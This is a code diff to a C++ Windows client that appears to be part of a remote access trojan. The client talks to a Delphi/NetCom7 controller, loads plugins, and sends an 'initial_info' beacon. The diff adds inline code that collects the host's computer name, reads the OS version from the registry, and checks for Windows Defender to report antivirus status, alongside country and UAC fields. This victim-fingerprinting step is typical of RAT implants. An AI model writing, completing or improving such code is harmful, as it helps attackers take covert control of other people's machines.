@@ -9,10 +9,11 @@
 #include <chrono>
 #include <cstdint>
 #include "../include/json.hpp"
-#include "../include/SysInfo.hpp"
 #include "../include/PluginManager.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "user32.lib")
 
 using json = nlohmann::json;
 using namespace std;
@@ -31,7 +32,15 @@ private:
     PluginManager pluginMgr;
     bool connected = false;
 
-    // Veri gönderme: Delphi/NetCom7 için sonuna \r\n ekler (Mevcut yapıya dönüş)
+    // Registry helper for initial info
+    string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
+        char data[255];
+        DWORD dataSize = sizeof(data);
+        if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
+            return string(data);
+        return "N/A";
+    }
+
     void send_data(json data) {
         if (!connected) return;
         string msg = data.dump() + "\r\n";
@@ -74,11 +83,7 @@ private:
 
             recv_buffer.insert(recv_buffer.end(), chunk, chunk + bytesRead);
 
-            // Gelen mesaj hem binary paket hem de düz \r\n JSON olabilir.
-            // Delphi tarafı bazen düz gönderiyorsa diye kontrol ediyoruz.
-
             while (!recv_buffer.empty()) {
-                // 1. Binary Paket Kontrolü
                 if (recv_buffer.size() >= sizeof(PacketHeader)) {
                     PacketHeader* header = (PacketHeader*)recv_buffer.data();
                     if (header->signature == 0x524E) {
@@ -99,7 +104,6 @@ private:
                     }
                 }
 
-                // 2. Düz JSON (\r\n) Kontrolü (Geriye uyumluluk için)
                 string current_buf((char*)recv_buffer.data(), recv_buffer.size());
                 size_t pos = current_buf.find("\r\n");
                 if (pos != string::npos) {
@@ -108,8 +112,7 @@ private:
                     continue;
                 }
 
-                // Senkronizasyon kaybolmuşsa veya paket yarım kalmışsa
-                if (recv_buffer.size() > 1024 * 1024) recv_buffer.clear(); // Emniyet
+                if (recv_buffer.size() > 1024 * 1024) recv_buffer.clear();
                 break;
             }
         }
@@ -121,13 +124,17 @@ private:
         char date_buf[20];
         strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));
 
+        char pcname[256];
+        DWORD pSize = sizeof(pcname);
+        GetComputerNameA(pcname, &pSize);
+
         json info = {
             {"action",    "initial_info"},
             {"ip",        "127.0.0.1"},
-            {"os",        SysInfo::getOS()},
+            {"os",        getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName")},
             {"country",   "Turkey"},
-            {"desktop",   SysInfo::getPCName()},
-            {"antivirus", SysInfo::getAntivirus()},
+            {"desktop",   string(pcname)},
+            {"antivirus", (GetFileAttributesA("C:\\ProgramData\\Microsoft\\Windows Defender") != INVALID_FILE_ATTRIBUTES) ? "Windows Defender" : "Other/None"},
             {"uac",       "Enabled"},
             {"date",      string(date_buf)}
         };
